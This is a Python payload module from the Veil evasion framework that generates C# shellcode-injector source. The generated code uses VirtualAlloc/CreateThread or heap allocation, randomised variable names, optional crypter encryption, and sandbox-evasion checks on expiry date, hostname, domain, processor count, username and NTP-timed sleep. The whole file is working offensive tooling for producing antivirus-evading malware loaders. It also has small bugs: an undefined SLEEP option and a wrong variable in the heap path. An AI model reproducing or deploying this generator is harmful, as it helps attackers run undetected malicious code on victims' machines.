"""

C# inline shellcode injector using the VirtualAlloc()/CreateThread() pattern.
Uses basic variable renaming obfuscation.

Adapated from code from:
    http://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/

Module built by @harmj0y
Updated for Veil 3 by @evan_pena2003

"""

import base64
from Tools.Evasion.evasion_common import encryption
from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Poor"
        self.description = "C# VirtualAlloc method for inline shellcode injection"
        self.name = "C# Flat Shellcode Injector"
        self.path = "cs/shellcode_inject/base64"
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "USE_ARYA"       : ["N", "Use the Arya crypter"],
                                    "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "USERNAME"       : ["X", "Optional: The required user account"]
                                }

    def generate(self):

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        # Base64 Encode Shellcode
        Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])
        Shellcode = base64.b64encode(bytes(Shellcode, 'latin-1')).decode('ascii')

        # randomize all our variable names, yo'
        namespaceName = evasion_helpers.randomString()
        className = evasion_helpers.randomString()
        bytearrayName = evasion_helpers.randomString()
        funcAddrName = evasion_helpers.randomString()
        shellcodeName = evasion_helpers.randomString()

        hThreadName = evasion_helpers.randomString()
        threadIdName = evasion_helpers.randomString()
        pinfoName = evasion_helpers.randomString()
        num_tabs_required = 0

        # get 12 random variables for the API imports
        r = [evasion_helpers.randomString() for x in range(12)]
        y = [evasion_helpers.randomString() for x in range(17)]        

        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
        payload_code += "namespace %s { class %s  {\n" % (namespaceName, className)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
        payload_code += "static void Main() {\n"
        num_tabs_required += 2 

        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = evasion_helpers.randomString()
            RandExpire = evasion_helpers.randomString()            

            # Create Payload code
            payload_code += '\t' * num_tabs_required + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
            payload_code += '\t' * num_tabs_required + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, self.required_options["EXPIRE_PAYLOAD"][0])
            payload_code += '\t' * num_tabs_required + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["HOSTNAME"][0].lower() != "x":

            payload_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(self.required_options["HOSTNAME"][0].lower())            

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["DOMAIN"][0].lower() != "x":

            payload_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower() != System.Environment.UserDomainName.ToLower()) {\n'                        

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":

            payload_code += '\t' * num_tabs_required + 'if (System.Environment.ProcessorCount > {}) {{\n'.format(self.required_options["PROCESSORS"][0])

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = evasion_helpers.randomString()
            rand_char_name = evasion_helpers.randomString()
            
            payload_code += '\t' * num_tabs_required + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
            payload_code += '\t' * num_tabs_required + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
            payload_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, self.required_options["USERNAME"][0])            

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["SLEEP"][0].lower() != "x":
            
            payload_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
            payload_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            payload_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
            payload_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
            payload_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
            payload_code += '\t' * num_tabs_required + 'Thread.Sleep(' + self.required_options["SLEEP"][0] + '*1000);\n'
            payload_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            payload_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
            payload_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
            payload_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + self.required_options["SLEEP"][0] + ' || skip) {\n'

            # Add a tab for this check
            num_tabs_required += 1

        payload_code += '\t' * num_tabs_required + "string %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));" % (bytearrayName, Shellcode)

        payload_code += "string[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
        payload_code += "byte[] %s = new byte[chars.Length];\n" %(shellcodeName)
        payload_code += "for (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":        

            payload_code += '\t' * num_tabs_required + "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" % (funcAddrName, shellcodeName)
            payload_code += '\t' * num_tabs_required + "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (shellcodeName, funcAddrName, shellcodeName)
            payload_code += '\t' * num_tabs_required + "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
            payload_code += '\t' * num_tabs_required + "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
            payload_code += '\t' * num_tabs_required + "WaitForSingleObject(%s, 0xFFFFFFFF);}\n" % (hThreadName)
            # payload_code += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":

            rand_heap = evasion_helpers.randomString()
            rand_ptr = evasion_helpers.randomString()            
            rand_var = evasion_helpers.randomString()            

            payload_code += '\t' * num_tabs_required + 'UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(rand_heap, bytearrayName)
            payload_code += '\t' * num_tabs_required + 'UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(rand_ptr, rand_heap, bytearrayName)
            payload_code += '\t' * num_tabs_required + 'RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(rand_ptr, bytearrayName, bytearrayName)
            payload_code += '\t' * num_tabs_required + 'UInt32 {} = 0;\n'.format(rand_var)
            payload_code += '\t' * num_tabs_required + 'IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, rand_ptr, rand_var)
            payload_code += '\t' * num_tabs_required + 'WaitForSingleObject({}, 0xFFFFFFFF);}}\n'.format(hThreadName)


        while (num_tabs_required != 0):
            payload_code += '\t' * num_tabs_required + '}'
            num_tabs_required -= 1    

        if self.required_options["USE_ARYA"][0].lower() == "y":
            payload_code = encryption.arya(payload_code)

        self.payload_source_code = payload_code
        return
